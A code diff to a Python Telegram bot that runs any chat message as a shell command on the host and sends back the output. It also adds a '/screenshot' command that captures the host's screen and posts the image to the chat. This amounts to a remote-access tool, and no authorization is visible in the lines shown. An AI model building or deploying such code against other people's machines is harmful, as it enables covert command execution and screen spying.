@@ -5,6 +5,7 @@ from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 from PIL import ImageGrab
 from telegram.ext import BaseFilter
 from datetime import datetime
+import pyscreenshot as ImageGrab
 
 class CommandFilter(BaseFilter):
     def filter( self, message):
@@ -22,16 +23,26 @@ def start(update, context):
         logging.error(str(e))
 
 def exec_command(update, context):
-    command = update.message.text.split()
-    try:
-        output = subprocess.check_output(command, cwd= curr_dir).decode('utf-8')
-        logging.info("%s: %s", command, output)
-        if output:
-            context.bot.send_message(chat_id=update.effective_chat.id, text=output)
-        else:
-            context.bot.send_message(chat_id=update.effective_chat.id, text=update.message.text)
-    except Exception as e:
-        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
+    command_text = update.message.text
+    if(command_text[0] == "/"):
+        if command_text == "/screenshot":
+            filename = screenshot_location + "screenshot_%s.png" % str(update.effective_chat.id)
+            logging.info("Sending screenshot")
+            im = ImageGrab.grab()
+            im.save(filename)
+            photo = open(filename,'rb')
+            context.bot.send_photo(update.effective_chat.id,photo)
+    else:
+        command = command_text.split()
+        try:
+            output = subprocess.check_output(command, cwd= curr_dir).decode('utf-8')
+            logging.info("%s: %s", command, output)
+            if output:
+                context.bot.send_message(chat_id=update.effective_chat.id, text=output)
+            else:
+                context.bot.send_message(chat_id=update.effective_chat.id, text=update.message.text)
+        except Exception as e:
+            context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
 
 
 def main():
